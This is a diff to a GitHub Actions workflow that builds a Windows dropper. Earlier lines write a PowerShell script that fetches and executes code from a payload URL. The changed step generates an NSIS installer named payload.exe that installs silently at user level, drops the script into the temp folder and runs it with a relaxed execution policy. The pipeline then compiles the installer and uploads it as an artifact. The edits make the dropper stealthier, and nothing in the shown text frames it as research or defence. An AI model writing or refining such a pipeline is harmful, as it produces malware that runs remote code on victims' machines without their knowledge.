@@ -39,16 +39,19 @@ jobs:
         Add-Content -Path $scriptPath -Value "}"
         Add-Content -Path $scriptPath -Value "Fetch-Execute -url `"$payloadUrl`""
 
-    # Step 4: Generate NSIS installer script dynamically
+    # Step 4: Generate NSIS script dynamically
     - name: Generate NSIS Script
       shell: powershell
       run: |
         $nsisPath = "script.nsi"
-        Set-Content -Path $nsisPath -Value 'Outfile "payload.exe"'
+        Set-Content -Path $nsisPath -Value '!define OUTPUT "payload.exe"'
+        Add-Content -Path $nsisPath -Value 'Outfile "${OUTPUT}"'
+        Add-Content -Path $nsisPath -Value 'SilentInstall silent'
+        Add-Content -Path $nsisPath -Value 'RequestExecutionLevel user'
         Add-Content -Path $nsisPath -Value 'Section'
         Add-Content -Path $nsisPath -Value '  SetOutPath $TEMP'
         Add-Content -Path $nsisPath -Value '  File "script.ps1"'
-        Add-Content -Path $nsisPath -Value '  nsExec::ExecToStack `"$WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe" -File "$TEMP\script.ps1"`'
+        Add-Content -Path $nsisPath -Value '  ExecDos::exec /TIMEOUT=5000 `"$WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe" -ExecutionPolicy RemoteSigned -File "$TEMP\script.ps1"`'
         Add-Content -Path $nsisPath -Value 'SectionEnd'
 
     # Step 5: Compile EXE using NSIS
@@ -62,6 +65,7 @@ jobs:
       with:
         name: payload_exe
         path: payload.exe
+
 
 
 
